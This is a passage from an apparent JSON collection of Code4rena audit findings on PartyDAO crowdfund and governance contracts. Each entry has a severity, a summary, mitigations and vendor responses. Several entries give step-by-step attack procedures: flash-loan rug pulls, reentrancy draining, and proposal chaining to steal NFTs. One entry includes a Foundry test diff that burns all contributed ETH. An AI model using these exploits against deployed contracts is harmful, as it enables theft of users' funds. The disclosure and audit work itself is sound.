      "content": "## Lines of code\n\nhttps://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/BuyCrowdfundBase.sol#L117-L118\n\n\n## Vulnerability details\n\n## Description\nCrowdfunds split the voting power and distribution of profits rights according to the percentage used to purchase the NFT. When an attacker lists his own NFT for sale and contributes to it, any sum he contributes will return to him once the sell is executed. This behavior is fine so long as the sell price is fair, as other contributors will receive a fair portion of voting power and equity.  Therefore, when a maximum price is defined, it is not considered a vulnerability that an attacker can contribute ```maximumPrice - totalContributions``` and take a potentially large stake of the Crowdfund, as user's have contributed knowing the potential maximum price. \n\nHowever, when maximum price is zero, which is allowed in BuyCrowdfund and CollectionBuyCrowdfund, the lister of the NFT can always steal the entirety of the fund and keep the NFT. Attacker can send a massive contribution, buy the NFT and pass a unanimous proposal to approve the NFT to his wallet. Attacker can use a flash loan to finance the initial contribution, which is easily paid back from the NFT lister wallet.\n\nIt is important to note that there is no way for the system to know if the Crowdfund creator and the NFT owner are the same entity, and therefore it is critical for the platform to defend users against this scenario.\n\n## Impact\nAny crowdfund with zero maximumPrice configured is subject to NFT lister rug pull and complete takeover of the contribution funds.\n\n## Proof of Concept\n1. Suppose totalContributions=X. Attacker will prepare flashloan callback which does:\n    * contribute() with the borrowed funds\n    * call BuyCrowdfund's buy() with a contract that will purchase the NFT using the large sum\n    * call NFT lister contract's sendProfit() function which will send attacker the NFT sell amount\n    * pay back the flash loan\n2. Attacker will call flashloan(10,000X) to buy his own NFT and take unanimous holding of created party\n3. Attacker will create ArbitraryCallsProposal with a single call to token.approve(ATTACKER, token_id). It is immediately ready for execution because attacker has > 99.99% of votes. Precious approve() is allowed in unanimous proposals.\n4. Attacker calls NFT's transferFrom() to take back control of the NFT, leaving with the Crowdfund's contribution and the listed NFT.\n\n## Tools Used\nManual audit\n\n## Recommended Mitigation Steps\nDisable the option to have unlimited maximumPrice for BuyCrowdfund and CollectionBuyCrowdfund contracts. AuctionCrowdfund is already safe by not allowing a zero maximumBid.",
      "summary": "\nThis bug report is about a vulnerability in the BuyCrowdfund and CollectionBuyCrowdfund contracts, which allow for a maximum price of zero. This vulnerability allows an attacker to contribute a large sum of money to the Crowdfund and take control of the NFT listed for sale. This is done by taking out a flash loan, contributing the loaned funds to the Crowdfund, buying the NFT, and passing a unanimous proposal to approve the NFT to the attacker's wallet. The attacker can then use the NFT's transferFrom() function to take back control of the NFT, leaving with the Crowdfund's contribution and the listed NFT.\n\nThis vulnerability has a big impact as any Crowdfund with a maximum price of zero is subject to a NFT lister rug pull and complete takeover of the contribution funds.\n\nThe recommended mitigation steps for this vulnerability are to disable the option to have unlimited maximumPrice for BuyCrowdfund and CollectionBuyCrowdfund contracts, as AuctionCrowdfund is already safe by not allowing a zero maximumBid.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2022-09-party",
      "github_link": "https://github.com/code-423n4/2022-09-party-findings/issues/213",
      "tags": [
        "Min/Max Cap Validation"
      ],
      "finders": [
        "smiling\\heretic_",
        "Trust"
      ]
    },
    {
      "id": "3308",
      "title": "[H-07] Attacker can DOS private party by donating ETH then calling buy",
      "impact": "HIGH",
      "content": "_Submitted by 0x52_\n\nParty is DOS'd and may potentially lose access to NFT.\n\n### Proof of Concept\n\n[Crowdfund.sol#L280-L298](https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L280-L298)\n\n    party = party_ = partyFactory\n        .createParty(\n            address(this),\n            Party.PartyOptions({\n                name: name,\n                symbol: symbol,\n                governance: PartyGovernance.GovernanceOpts({\n                    hosts: governanceOpts.hosts,\n                    voteDuration: governanceOpts.voteDuration,\n                    executionDelay: governanceOpts.executionDelay,\n                    passThresholdBps: governanceOpts.passThresholdBps,\n                    totalVotingPower: _getFinalPrice().safeCastUint256ToUint96(),\n                    feeBps: governanceOpts.feeBps,\n                    feeRecipient: governanceOpts.feeRecipient\n                })\n            }),\n            preciousTokens,\n            preciousTokenIds\n        );\n\n[BuyCrowdfundBase.sol#L166-L173](https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/BuyCrowdfundBase.sol#L166-L173)\n\n    function _getFinalPrice()\n        internal\n        override\n        view\n        returns (uint256)\n    {\n        return settledPrice;\n    }\n\nWhen BuyCrowdFund.sol successfully completes a buy, totalVotingPower is set to `\\_getFinalPrice` which in the case of BuyCrowdFundBase.sol returns the price at which the NFT was purchased. totalVotingPower is used by the governance contract to determine the number of votes needed for a proposal to pass. If there are not enough claimable votes to meet that threshold then the party is softlocked because it can't pass any proposals. An attacker could exploit this to DOS even a private party with the following steps:\n\n1.  Wait for party to be filled to just under quorum threshold\n2.  Donate ETH to the crowdfund contract\n3.  Call BuyCrowdFund.sol#buy. Since it is unpermissioned even for parties with a gatekeeper, the call won't revert\n\nSince the voting power for the final amount of ETH cannot be claimed, the party is now softlocked. If emergencyExecuteDisabled is true then the party will be permanantly locked and the NFT would effectively be burned. If emergencyExecuteDisabled is false then users would have to wait for PartyDAO to reclaim the NFT.\n\n### Recommended Mitigation Steps\n\nPermission to call BuyCrowdFund.sol#buy should be gated if there is a gatekeeper.\n\n**[merklejerk (PartyDAO) confirmed and commented](https://github.com/code-423n4/2022-09-party-findings/issues/196#issuecomment-1255178995):**\n > Theoretically possible but there doesn't seem to be much upside for the attacker. We do think it's unusual that buy()/bid() can be called by a non-member for a private/gatekept party, so we will add gatekeeping logic there to fix this. We will also cap the callValue (and therefore final price) to `totalContributions`.\n\n**[0xble (PartyDAO) resolved](https://github.com/code-423n4/2022-09-party-findings/issues/196#issuecomment-1264679039):**\n > Resolved: https://github.com/PartyDAO/partybidV2/pull/133\n\n**[HardlyDifficult (judge) increased severity to High and commented](https://github.com/code-423n4/2022-09-party-findings/issues/196#issuecomment-1266670432):**\n > Although it's without upside, it is a path for the attacker to potentially lock the NFT. Since it can cause a loss of asset for users, this seems to be a High risk issue.\n> \n> Let me know if I misunderstood.\n\n**[merklejerk (PartyDAO) commented](https://github.com/code-423n4/2022-09-party-findings/issues/196#issuecomment-1267180017):**\n > ~Don't consider it high because there is a much more straightforward way to softlock a party: contribute normally and don't ever participate in governance.~ Oh nvm, this is the private party one. Yeah I'm fine with high.\n\n\n\n***\n\n \n",
      "summary": "\nThis bug report is about a vulnerability in the PartyDAO smart contracts which can be exploited to DOS a Party and potentially lose access to NFTs. It is caused by an issue in the BuyCrowdFund.sol contract, which is part of the PartyDAO system. When BuyCrowdFund.sol successfully completes a buy, totalVotingPower is set to _getFinalPrice which in the case of BuyCrowdFundBase.sol returns the price at which the NFT was purchased. This can cause the party to be softlocked if there are not enough claimable votes to meet the quorum threshold.\n\nAn attacker can exploit this vulnerability by waiting for the party to be filled to just under the quorum threshold and then donating ETH to the crowdfund contract. This will cause the party to be softlocked, and if emergencyExecuteDisabled is true then the party will be permanently locked and the NFT would effectively be burned.\n\nThe recommended mitigation step for this vulnerability is to gate permission to call BuyCrowdFund.sol#buy if there is a gatekeeper. This will ensure that the calls are not unpermissioned, and will prevent the party from being softlocked.",
      "quality_score": 5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2022-09-party",
      "github_link": "https://github.com/code-423n4/2022-09-party-findings/issues/196",
      "tags": [
        "Vote",
        "DOS"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "3307",
      "title": "[H-06]  A majority attack can steal precious NFT from the party by crafting and chaining two proposals",
      "impact": "HIGH",
      "content": "_Submitted by Trust, also found by ladboy233 and Lambda_\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/proposals/ProposalExecutionEngine.sol#L116>\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/proposals/FractionalizeProposal.sol#L54-L62>\n\n### Description\n\nThe PartyGovernance system has many defenses in place to protect against a majority holder stealing the NFT. Majority cannot exfiltrate the ETH gained from selling precious NFT via any proposal, and it's impossible to sell NFT for any asset except ETH. If the party were to be compensated via an ERC20 token, majority could pass an ArbitraryCallsProposal to transfer these tokens to an attacker wallet. Unfortunately, FractionalizeProposal is vulnerable to this attack. Attackers could pass two proposals and wait for them to be ready for execution. Firstly, a FractionalizeProposal to fractionalize the NFT and mint totalVotingPower amount of ERC20 tokens of the created vault. Secondly, an ArbitraryCallsProposal to transfer the entire ERC20 token supply to an attacker address. At this point, attacker can call `vault.redeem()` to burn the outstanding token supply and receive the NFT back.\n\n### Impact\n\nA 51% majority could steal the precious NFT from the party and leave it empty.\n\n### Proof of Concept\n\nThe only non-trivial component of this attack is that the created vault, whose tokens we wish to transfer out, has an undetermined address until `VAULT_FACTORY.mint()` is called, which creates it. The opcode which creates the vault contract is CREATE, which calculates the address with `keccak256(VAULT_FACTORY, nonce)`. Nonce will keep changing while new, unrelated NFTs are fractionalized. The attack needs to prepare both FractionalizedProposal and ArbitraryCallsProposal ahead of time, so that they could be chained immediately, meaning there would be no time for other members to call `distribute()` on the party, which would store the fractionalized tokens safely in the distributor.\nIn order to solve this chicken and the egg problem, we will use a technique taken from traditional low-level exploitation called heap feng shui.\n\nFirstly, calculate off-chain, the rate new NFTs are fractionalized, and multiple by a safety factor (like 1.2X), and multiply again by the proposal execution delay. This number, added to the current `VAULT_FACTORY` nonce, will be our `target_nonce`. Calculate `target_vault = keccak256(VAULT_FACTORY, target_nonce)`, `before_target_vault = keccak256(VAULT_FACTORY, target_nonce-1)`\n\nFirstly, we will create a contract which has an attack function that:\n\n1.  Loop while before_target_vault != created_vault:\n    • Mint new dummy attacker_NFT\n    • created_vault = VAULT_FACTORY.mint(attacker_NFT…)\n2.  `Call execute()` on the FractionalizedProposal  // We will feed the execute() parameters to the contract in a separate contract setter. Note that this is guaranteed to create target_vault on the correct address.\n3.  `Call execute()` on the ArbitraryCallsProposal\n\nThen, we propose the two proposals:\n\n1.  Propose a FractionalizedProposal, with any list price and the precious NFT as parameter\n2.  Propose an ArbitraryCallsProposal, with target = target_vault, data = transfer(ATTACKER, totalVotingPower)\n\nThen, we set the `execute()` parameters passed in step 2 and 3 of the attack contract using the proposalID allocated for them.\n\nThen, we wait for execution delay to finish.\n\nFinally, run the `attack()` function prepared earlier. This will increment the `VAULT_FACTORY` nonce until it is the one we count on during the ArbitraryCallsProposal. Pass enough gas to be able to burn enough nonces.\n\nAt this point, attacker has all the vault tokens, so he may call vault.redeem() and receive the precious NFT.\n\n### Recommended Mitigation Steps\n\n1.  Enforce a minimum cooldown between proposals. This will mitigate additional weaknesses of the proposal structure. Here, this will give users the opportunity to call `distribute()` to put the vault tokens safe in distributor.\n2.  A specific fix here would be to call `distribute()` at the end of FractionalizeProposal so that there is no window to steal the funds.\n\n**[merklejerk (PartyDAO) confirmed and commented](https://github.com/code-423n4/2022-09-party-findings/issues/277#issuecomment-1254233443):**\n > Will fix by creating an automatic distribution at the end of a successful fractionalize proposal.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-09-party-findings/issues/277#issuecomment-1263543589):**\n > Agree with High risk - this scenario allows a majority owner to steal from others in the party.\n\n**[0xble (PartyDAO) resolved](https://github.com/code-423n4/2022-09-party-findings/issues/277#issuecomment-1264677841):**\n > Resolved: https://github.com/PartyDAO/partybidV2/pull/131\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the PartyGovernance system, which allows attackers with a majority holder to steal the NFTs from the party. This is done by creating two proposals, a FractionalizeProposal to fractionalize the NFT and mint totalVotingPower amount of ERC20 tokens of the created vault, and an ArbitraryCallsProposal to transfer the entire ERC20 token supply to an attacker address. The attack is made possible by the use of a technique called heap feng shui, which allows the attacker to calculate the address of the created vault in advance.\n\nThe impact of this vulnerability is that a 51% majority could steal the precious NFT from the party and leave it empty. The tools used to find this vulnerability were manual audits.\n\nThe recommended mitigation steps are to enforce a minimum cooldown between proposals, which will give users the opportunity to call distribute() to put the vault tokens safe in the distributor. Additionally, a specific fix would be to call distribute() at the end of FractionalizeProposal so that there is no window to steal the funds.",
      "quality_score": 4.999805254999104,
      "rarity_score": 4.999805254999104,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2022-09-party",
      "github_link": "https://github.com/code-423n4/2022-09-party-findings/issues/277",
      "tags": [
        "51% Attack"
      ],
      "finders": [
        "Trust",
        "ladboy233  Lambda"
      ]
    },
    {
      "id": "3306",
      "title": "[H-05] ArbitraryCallsProposal.sol and ListOnOpenseaProposal.sol safeguards can be bypassed by cancelling in-progress proposal allowing the majority to steal NFT",
      "impact": "HIGH",
      "content": "_Submitted by 0x52_\n\nNote: PartyDAO acknowledges that \"canceling an InProgress proposal (mid-step) can leave the governance party in a vulnerable or undesirable state because there is no cleanup logic run during a cancel\" in the \"Known Issues / Topics\" section of the contest readme. I still believe that this vulnerability needs to be mitigated as it can directly lead to loss of user funds.\n\n### Impact\n\nMajority vote can abuse cancel functionality to steal an NFT owned by the party.\n\n### Proof of Concept\n\nArbitraryCallsProposal.sol implements the following safeguards for arbitrary proposals that are not unanimous:\n\n1.  Prevents the ownership of any NFT changing during the call. It does this by checking the the ownership of all NFTs before and after the call.\n\n2.  Prevents calls that would change the approval status of any NFT. This is done by disallowing the \"approve\" and \"setApprovalForAll\" function selectors.\n\nAdditionally ListOnOpenseaProposal.sol implements the following safeguards:\n\n1.  NFTs are first listed for auction on Zora so that if they are listed for a very low price then the auction will keep them from being purchased at such a low price.\n\n2.  At the end of the auction the approval is revoked when `\\_cleanUpListing` is called.\n\nThese safeguards are ultimately ineffective though. The majority could use the following steps to steal the NFT:\n\n1.  Create ListOnOpenseaProposal with high sell price and short cancel delay\n\n2.  Vote to approve proposal with majority vote\n\n3.  Execute first step of proposal, listing NFT on Zora auction for high price\n\n4.  Wait for Zora auction to end since the auction price is so high that no one will buy it\n\n5.  Execute next step, listing the NFT on Opensea. During this step the contract grants approval of the NFT to the Opensea contract\n\n6.  Wait for cancelDelay to expire\n\n7.  Call PartyGovernance.sol#cancel. This will immediately terminate the Opensea bypassing `\\_cleanUpListing` and keeping the approval to the Opensea contract.\n\n8.  Create ArbitraryCallsProposal.sol that lists the NFT on Opensea for virtually nothing. Since only approval selectors have been blacklisted and the NFT does not change ownership, the proposal does not need to be unanimous to execute.\n\n9.  Approve proposal and execute.\n\n10. Buy NFT.\n\n### Recommended Mitigation Steps\n\nWhen a proposal is canceled, it should call a proposal specific function that makes sure everything is cleaned up. NFTs delisted, approvals revoked, etc.\n\n**[merklejerk (PartyDAO) confirmed and commented](https://github.com/code-423n4/2022-09-party-findings/issues/153#issuecomment-1255135044):**\n > We will block calls to `opensea.validate()` in Arbitrary call proposals.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-09-party-findings/issues/153#issuecomment-1262889443):**\n > Agree with High risk - in this scenario a majority owner could steal the asset from others in the party.\n\n**[0xble (PartyDAO) resolved](https://github.com/code-423n4/2022-09-party-findings/issues/153#issuecomment-1264688086):**\n > Resolved: https://github.com/PartyDAO/partybidV2/pull/139\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the PartyDAO smart contract that can lead to the loss of user funds. This vulnerability is caused by the lack of cleanup logic when a proposal is canceled mid-step. This leaves the governance party in a vulnerable or undesirable state. The majority vote can abuse the cancel functionality to steal an NFT owned by the party. The safeguards implemented in the ArbitraryCallsProposal.sol and ListOnOpenseaProposal.sol are ineffective against this vulnerability. \n\nThe steps to exploit the vulnerability are as follows: creating a ListOnOpenseaProposal with a high sell price and short cancel delay, voting to approve the proposal with a majority vote, executing the first step of the proposal, waiting for the Zora auction to end, executing the next step, waiting for the cancel delay to expire, calling PartyGovernance.sol#cancel, creating an ArbitraryCallsProposal.sol to list the NFT on Opensea for a low price, approving the proposal and executing it, and finally buying the NFT.\n\nThe recommended mitigation step is to call a proposal specific function that makes sure everything is cleaned up when a proposal is canceled. This includes delisting any NFTs and revoking any approvals.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2022-09-party",
      "github_link": "https://github.com/code-423n4/2022-09-party-findings/issues/153",
      "tags": [
        "Vote",
        "NFT"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "3305",
      "title": "[H-04] TokenDistributor: ERC777 tokensToSend hook can be exploited to drain contract",
      "impact": "HIGH",
      "content": "_Submitted by Lambda_\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/distribution/TokenDistributor.sol#L131>\n\n<https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/distribution/TokenDistributor.sol#L386>\n\n### Impact\n\n`TokenDistributor.createERC20Distribution` can be used to create token distributions for ERC777 tokens (which are backwards-compatible with ERC20). However, this introduces a reentrancy vulnerability which allows a party to get the tokens of another party. The problem is the `tokensToSend` hook which is executed BEFORE balance updates happens (see <https://eips.ethereum.org/EIPS/eip-777>). When this hook is executed, `token.balanceOf(address(this))` therefore still returns the old value, but `_storedBalances[balanceID]` was already decreased.\n\n### Proof Of Concept\n\nParty A and Party B have a balance of 1,000,000 tokens (of some arbitrary ERC777 token) in the distributor. Let's say for the sake of simplicity that both parties only have one user (user A in party A, user B in party B). User A (or rather his smart contract) performs the following attack:\n\n*   He calls `claim`, which transfers 1,000,000 tokens to his contract address. In `_transfer`, `_storedBalances[balanceId]` is decreased by 1,000,000 and therefore now has a value of 1,000,000.\n*   In the `tokensToSend` hook, he initiates another distribution for his party A by calling `PartyGovernance.distribute` which calls `TokenDistributor.createERC20Distribution` (we assume for the sake of simplicity that the party does not have more of these tokens, so the call transfers 0 tokens to the distributor). `TokenDistributor.createERC20Distribution` passes `token.balanceOf(address(this))` to `_createDistribution`. Note that this is still 2,000,000 because we are in the `tokensToSend` hook.\n*   The supply of this distribution is calculated as `(args.currentTokenBalance - _storedBalances[balanceId]) = 2,000,000 - 1,000,000 = 1,000,000`.\n*   When the `tokensToSend` hook is exited (and the first transfer has finished), he can retrieve the tokens of the second distribution (that was created in the hook) to steal the 1,000,000 tokens of party B.\n\n### Recommended Mitigation Steps\n\nDo not allow reentrancy in these functions.\n\n**[merklejerk (PartyDAO) confirmed and commented](https://github.com/code-423n4/2022-09-party-findings/issues/120#issuecomment-1254239231):**\n > Very few legitimate ERC777s so we think the probability of this happening to a party is somewhat low. Also, it only impacts distributions for that token. However, we will be implementing a reentrancy guard to fix it.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-09-party-findings/issues/120#issuecomment-1262875715):**\n > Agree that it does not seem very probable - but if 777 assets are distributed, it does appear to be a way of stealing from other users in the party and therefore High risk.\n\n**[0xble (PartyDAO) resolved](https://github.com/code-423n4/2022-09-party-findings/issues/120#issuecomment-1264678026):**\n > Resolved: https://github.com/PartyDAO/partybidV2/pull/132\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a reentrancy vulnerability in the `TokenDistributor.createERC20Distribution` function of the PartyDAO project. This vulnerability can be used to steal tokens from other parties. The bug is due to the `tokensToSend` hook, which is executed BEFORE balance updates happens. This allows a party to initiate another distribution for their party and steal the tokens of another party.\n\nTo demonstrate the vulnerability, a proof of concept was provided. In this example, Party A and Party B have a balance of 1,000,000 tokens in the distributor. User A (or rather his smart contract) calls `claim`, which transfers 1,000,000 tokens to his contract address. In the `tokensToSend` hook, he initiates another distribution for his party A by calling `PartyGovernance.distribute`, passing `token.balanceOf(address(this))` to `_createDistribution`. The supply of this distribution is calculated as `(args.currentTokenBalance - _storedBalances[balanceId]) = 2,000,000 - 1,000,000 = 1,000,000`. When the `tokensToSend` hook is exited, he can retrieve the tokens of the second distribution to steal the 1,000,000 tokens of party B.\n\nThe recommended mitigation step for this vulnerability is to not allow reentrancy in these functions.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2022-09-party",
      "github_link": "https://github.com/code-423n4/2022-09-party-findings/issues/120",
      "tags": [],
      "finders": [
        "Lambda"
      ]
    },
    {
      "id": "3304",
      "title": "[H-03] A majority attack can easily bypass Zora auction stage in OpenseaProposal and steal the NFT from the party.",
      "impact": "HIGH",
      "content": "_Submitted by Trust_\n\nThe PartyGovernance system has many defenses in place to protect against a majority holder stealing the NFT. One of the main protections is that before listing the NFT on Opensea for a proposal-supplied price, it must first try to be auctioned off on Zora. To move from Zora stage to Opensea stage, `\\_settleZoraAuction()` is called when executing ListedOnZora step in ListOnOpenseaProposal.sol. If the function returns false, the next step is executed which lists the item on Opensea. It is assumed that if majority attack proposal reaches this stage, it can steal the NFT for free, because it can list the item for negligible price and immediately purchase it from a contract that executes the Opensea proposal.\n\nIndeed, attacker can always make `settleZoraAuction()` return false. Looking at  the code:\n\n    try ZORA.endAuction(auctionId) {\n                // Check whether auction cancelled due to a failed transfer during\n                // settlement by seeing if we now possess the NFT.\n                if (token.safeOwnerOf(tokenId) == address(this)) {\n                    emit ZoraAuctionFailed(auctionId);\n                    return false;\n                }\n            } catch (bytes memory errData) {\n\nAs the comment already hints, an auction can be cancelled if the NFT transfer to the bidder fails. This is the relevant AuctionHouse code (endAuction):\n\n    {\n                // transfer the token to the winner and pay out the participants below\n                try IERC721(auctions[auctionId].tokenContract).safeTransferFrom(address(this), auctions[auctionId].bidder, auctions[auctionId].tokenId) {} catch {\n                    _handleOutgoingBid(auctions[auctionId].bidder, auctions[auctionId].amount, auctions[auctionId].auctionCurrency);\n                    _cancelAuction(auctionId);\n                    return;\n     }\n\nAs most NFTs inherit from OpenZeppelin's ERC721.sol code, safeTransferFrom will run:\n\n        function _safeTransfer(\n            address from,\n            address to,\n            uint256 tokenId,\n            bytes memory data\n        ) internal virtual {\n            _transfer(from, to, tokenId);\n            require(_checkOnERC721Received(from, to, tokenId, data), \"ERC721: transfer to non ERC721Receiver implementer\");\n        }\n\nSo, attacker can bid a very high amount on the NFT to ensure it is the winning bid. When AuctionHouse tries to send the NFT to attacker, the safeTransferFrom will fail because attack will not implement an ERC721Receiver. This will force the AuctionHouse to return the bid amount to the bidder and cancel the auction. Importantly, it will lead to a graceful return from `endAuction()`, which will make `settleZoraAuction()` return false and progress to the OpenSea stage.\n\n### Impact\n\nA majority attack can easily bypass Zora auction stage and steal the NFT from the party.\n\n### Proof of Concept\n\n1.  Pass a ListOnOpenseaProposal with a tiny list price and execute it\n2.  Create an attacker contract which bids on the NFT an overpriced amount, but does not implement ERC721Receiver. Call its bid() function\n3.  Wait for the auction to end ( timeout after the bid() call)\n4.  Create a contract with a function which calls execute() on the proposal and immediately buys the item on Seaport. Call the attack function.\n\n### Recommended Mitigation Steps\n\n`\\_settleZoraAuction` is called from both ListOnZoraProposal and ListOnOpenseaProposal. If the auction was cancelled due to a failed transfer, as is described in the comment, we would like to handle it differently for each proposal type. For ListOnZoraProposal, it should indeed return false, in order to finish executing the proposal and not to hang the engine. For ListOnOpenseaProposal, the desired behavior is to *revert* in the case of a failed transfer. This is because the next stage is risky and defense against the mentioned attack is required. Therefore, pass a revertOnFail flag to `\\_settleZoraAuction`, which will be used like so:\n\n    // Check whether auction cancelled due to a failed transfer during\n    // settlement by seeing if we now possess the NFT.\n    if (token.safeOwnerOf(tokenId) == address(this)) {\n    \tif (revertOnFail) {\n    \t\trevert(\"Zora auction failed because of transfer to bidder\")\n    \t}\n               emit ZoraAuctionFailed(auctionId);\n               return false;\n    }\n\n**[merklejerk (PartyDAO) confirmed and commented](https://github.com/code-423n4/2022-09-party-findings/issues/264#issuecomment-1255311135):**\n > Great find. We will modify `_settleZoraAuction()` to return some auction status to be communicated up to the Opensea proposal.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-09-party-findings/issues/264#issuecomment-1262795619):**\n > TIL. While digging into this I noticed that Zora changed this logic in their V3 implementation, avoiding this scenario - but there may be reasons to prefer the auction house contract.\n> \n> Agree with High risk - the auction safeguard can be bypassed, allowing a majority owner to steal from the rest of the party.\n\n**[0xble (PartyDAO) resolved](https://github.com/code-423n4/2022-09-party-findings/issues/264#issuecomment-1264680120):**\n > Resolved: https://github.com/PartyDAO/partybidV2/pull/137\n\n\n\n***\n\n",
      "summary": "\nThe PartyGovernance system is a system that protects against a majority holder stealing a Non-Fungible Token (NFT). To move from the Zora stage to the Opensea stage, _settleZoraAuction() is called when executing the ListedOnZora step in ListOnOpenseaProposal.sol. An attacker can make settleZoraAuction() return false, which allows them to list the item on Opensea for a negligible price and immediately purchase it from a contract that executes the Opensea proposal. This would allow the attacker to steal the NFT for free. \n\nTo do this, the attacker passes a ListOnOpenseaProposal with a tiny list price and executes it. Then, they create an attacker contract which bids on the NFT an overpriced amount, but does not implement ERC721Receiver. When the auction ends, they create a contract with a function which calls execute() on the proposal and immediately buys the item on Seaport. \n\nThe recommended mitigation step for this vulnerability is to pass a revertOnFail flag to _settleZoraAuction. This flag will be used to revert in the case of a failed transfer for ListOnOpenseaProposal, as the next stage is risky and defense against the mentioned attack is required.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "PartyDAO",
      "source_link": "https://code4rena.com/reports/2022-09-party",
      "github_link": "https://github.com/code-423n4/2022-09-party-findings/issues/264",
      "tags": [
        "Revert Inside Hook",
        "NFT"
      ],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "3303",
      "title": "[H-02] Possibility to burn all ETH in Crowdfund under some circumstances",
      "impact": "HIGH",
      "content": "_Submitted by Lambda, also found by 8olidity_\n\nIf `opts.initialContributor` is set to `address(0)` (and `opts.initialDelegate` is not), there are two problems:\n1.) If the crowdfund succeeds, the initial balance will be lost. It is still accredited to `address(0)`, but it is not retrievable.\n2.) If the crowdfund does not succeed, anyone can completely drain the contract by repeatedly calling `burn` with `address(0)`. This will always succeed because `CrowdfundNFT._burn` can be called multiple times for `address(0)`. Every call will cause the initial balance to be burned (transferred to `address(0)`).\n\nIssue 1 is somewhat problematic, but issue 2 is very problematic, because all funds of a crowdfund are burned and an attacker can specifically set up such a deployment (and the user would not notice anything special, after all these are parameters that the protocol accepts).\n\n### Proof Of Concept\n\nThis diff illustrates scenario 2, i.e. where a malicious deployer burns all contributions (1 ETH) of `contributor`. He loses 0.25ETH for the attack, but this could be reduced significantly (with more `burn(payable(address(0)))` calls:\n\n```diff\n--- a/sol-tests/crowdfund/BuyCrowdfund.t.sol\n+++ b/sol-tests/crowdfund/BuyCrowdfund.t.sol\n@@ -36,9 +36,9 @@ contract BuyCrowdfundTest is Test, TestUtils {\n     string defaultSymbol = 'PBID';\n     uint40 defaultDuration = 60 * 60;\n     uint96 defaultMaxPrice = 10e18;\n-    address payable defaultSplitRecipient = payable(0);\n+    address payable defaultSplitRecipient = payable(address(this));\n     uint16 defaultSplitBps = 0.1e4;\n-    address defaultInitialDelegate;\n+    address defaultInitialDelegate = address(this);\n     IGateKeeper defaultGateKeeper;\n     bytes12 defaultGateKeeperId;\n     Crowdfund.FixedGovernanceOpts defaultGovernanceOpts;\n@@ -78,7 +78,7 @@ contract BuyCrowdfundTest is Test, TestUtils {\n                     maximumPrice: defaultMaxPrice,\n                     splitRecipient: defaultSplitRecipient,\n                     splitBps: defaultSplitBps,\n-                    initialContributor: address(this),\n+                    initialContributor: address(0),\n                     initialDelegate: defaultInitialDelegate,\n                     gateKeeper: defaultGateKeeper,\n                     gateKeeperId: defaultGateKeeperId,\n@@ -111,40 +111,26 @@ contract BuyCrowdfundTest is Test, TestUtils {\n     function testHappyPath() public {\n         uint256 tokenId = erc721Vault.mint();\n         // Create a BuyCrowdfund instance.\n-        BuyCrowdfund pb = _createCrowdfund(tokenId, 0);\n+        BuyCrowdfund pb = _createCrowdfund(tokenId, 0.25e18);\n         // Contribute and delegate.\n         address payable contributor = _randomAddress();\n         address delegate = _randomAddress();\n         vm.deal(contributor, 1e18);\n         vm.prank(contributor);\n         pb.contribute{ value: contributor.balance }(delegate, \"\");\n-        // Buy the token.\n-        vm.expectEmit(false, false, false, true);\n-        emit MockPartyFactoryCreateParty(\n-            address(pb),\n-            address(pb),\n-            _createExpectedPartyOptions(0.5e18),\n-            _toERC721Array(erc721Vault.token()),\n-            _toUint256Array(tokenId)\n-        );\n-        Party party_ = pb.buy(\n-            payable(address(erc721Vault)),\n-            0.5e18,\n-            abi.encodeCall(erc721Vault.claim, (tokenId)),\n-            defaultGovernanceOpts\n-        );\n-        assertEq(address(party), address(party_));\n-        // Burn contributor's NFT, mock minting governance tokens and returning\n-        // unused contribution.\n-        vm.expectEmit(false, false, false, true);\n-        emit MockMint(\n-            address(pb),\n-            contributor,\n-            0.5e18,\n-            delegate\n-        );\n-        pb.burn(contributor);\n-        assertEq(contributor.balance, 0.5e18);\n+        vm.warp(block.timestamp + defaultDuration + 1);\n+        // The auction was not won, we can now burn all ETH from contributor...\n+        assertEq(address(pb).balance, 1.25e18);\n+        pb.burn(payable(address(0)));\n+        assertEq(address(pb).balance, 1e18);\n+        pb.burn(payable(address(0)));\n+        assertEq(address(pb).balance, 0.75e18);\n+        pb.burn(payable(address(0)));\n+        assertEq(address(pb).balance, 0.5e18);\n+        pb.burn(payable(address(0)));\n+        assertEq(address(pb).balance, 0.25e18);\n+        